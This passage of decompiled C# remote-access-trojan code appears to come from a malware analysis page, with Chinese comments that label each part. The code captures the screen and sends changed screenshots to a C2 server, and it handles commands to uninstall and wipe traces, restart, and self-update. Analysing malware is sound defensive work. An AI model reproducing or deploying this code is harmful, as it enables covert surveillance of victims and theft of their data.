</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Size</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">screenWidth</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">screenHeight</span><span style="--0:#666666;--1:#999999">));</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 尝试绘制鼠标光标（提升截图完整性）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">Cursor</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Default</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Draw</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">g</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Rectangle</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Cursor</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Position</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Size</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">32</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">32</span><span style="--0:#666666;--1:#999999">)));</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">g</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Dispose</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 按参数缩放截图（array[1]=宽度，array[2]=高度）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#5DA994;--1:#2E8F82">Bitmap</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">scaledScreenshot</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Bitmap</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Parse</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]),</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Parse</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">]));</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">g</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Graphics</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">FromImage</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">scaledScreenshot</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">g</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">DrawImage</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">fullScreenshot</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">scaledScreenshot</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Width</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">scaledScreenshot</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Height</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">g</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Dispose</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 处理截图：避免重复回传（MD5对比lastcap）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ms</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">jpegMs</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">scaledScreenshot</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Save</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">jpegMs</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">ImageFormat</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Jpeg</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">screenshotMd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">md5</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">jpegMs</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">());</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 截图不同则回传，相同则仅传空标记</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">screenshotMd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">!=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">lastcap</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">lastcap</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">screenshotMd5</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Write</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">SB</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">CAP</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">),</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 拼接标识</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Write</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">jpegMs</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">(),</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#BD976A;--1:#B07D48">jpegMs</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">WriteByte</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Sendb</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">());</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 二进制回传截图数据到C2</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 清理资源（避免内存泄漏）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Dispose</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">jpegMs</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Dispose</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">fullScreenshot</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Dispose</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">scaledScreenshot</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Dispose</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支8：un - 自操作（卸载/退出/重启） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">un</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">subCmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">];</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">subCmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">~</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">UNS</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// UNS：自卸载（删除自身文件/注册表痕迹）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">subCmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">!</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 强制退出</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">pr</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 清理进程资源</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">ProjectData</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">EndApp</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 终止程序</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">subCmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">@</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 重启自身</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">pr</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">Process</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Start</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 启动恶意程序副本</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">ProjectData</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">EndApp</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 终止当前进程</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支9：up - 自更新（下载新版本恶意程序） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">up</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">updateData</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 场景1：从字节数组提取加密更新包</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">][</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">'</span><span style="--0:#C99076;--1:#A65E2B">\u001f</span><span style="--0:#666666;--1:#999999">'</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ms</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">skipLen</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Write</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">updateData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ZIP</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">());</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span 